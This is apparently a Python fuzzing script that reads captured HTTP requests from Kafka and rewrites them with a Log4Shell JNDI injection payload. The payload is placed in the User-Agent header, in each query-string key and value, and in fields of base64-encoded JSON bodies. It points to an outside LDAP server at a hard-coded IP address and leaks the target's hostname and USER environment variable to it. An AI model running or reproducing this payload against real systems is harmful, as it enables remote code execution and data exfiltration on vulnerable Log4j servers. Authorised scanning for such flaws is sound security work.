from kafka import KafkaConsumer, KafkaProducer
import json
import base64
from Event import Event

consumer = KafkaConsumer('requests', group_id='fuzzer', bootstrap_servers="localhost:9092")
producer = KafkaProducer(bootstrap_servers='localhost:9092', value_serializer=str.encode)

topic = "fuzzer"
inject = "${jndi:ldap://138.91.14.16:9999/<host>${env:USER:-unknown}}"
for msg in consumer:
    content = json.loads(msg.value.decode('ascii'))
    event = Event(content)
    host = event.PrettyHost
    content = event.Content
    path = event.Path
    userAgent = event.findHeader("User-Agent")
    injectVal = inject.replace("<host>", host)
    # Try user agent
    if userAgent != None:
        copy = event.copy()
        copy.setHeader("User-Agent", injectVal)
        print("Sending user agent")
        copy.Meta["Mutation"] = "user-agent"
        producer.send(topic, value=json.dumps(copy.toDict()))
    # Try the path
    if "?" in path:
        parse = path.split("?")
        args = parse[1].split("&")
        kvArgs = {}
        for arg in args:
            kv = arg.split("=")
            if len(kv) > 1:
                kvArgs[kv[0]] = kv[1]
            else:
                kvArgs[kv[0]] = ''
        for key, value in kvArgs.items():
            rebuildKey = "?"
            rebuildValue = "?"
            for ikey, ivalue in kvArgs.items():
                if rebuildKey != "?":
                    rebuildKey += "&"
                    rebuildValue += "&"
                if key == ikey:
                    rebuildKey += f"{injectVal}={ivalue}"
                    rebuildValue += f"{ikey}={injectVal}"
                else:
                    rebuildKey += f"{ikey}={ivalue}"
                    rebuildValue += f"{ikey}={ivalue}"
            copy = event.copy()
            copy.Path = f"{parse[0]}{rebuildKey}"
            copy.Meta["Mutation"] = "path:key"
            producer.send(topic, value=json.dumps(copy.toDict()))
            copy = event.copy()
            copy.Path = f"{parse[0]}{rebuildValue}"
            copy.Meta["Mutation"] = "path:value"
            producer.send(topic, value=json.dumps(copy.toDict()))
            print("Sending path")
    # Try json
    if content != None and content.startswith("ey"):
        try:
            data = json.loads(base64.b64decode(content))
            for key, value in data.items():
                dataCopy = json.loads(base64.b64decode(content))
                dataCopy[key] = injectVal
                copy = event.copy()
                copy.Content = base64.b64encode(json.dumps(dataCopy).encode("utf-8"))
                copy.Meta["Mutation"] = "json"
                producer.send(topic, value=json.dumps(copy.toDict()))
                print("Sending json")
        except:
            print(f"Wasnt json: {content}")
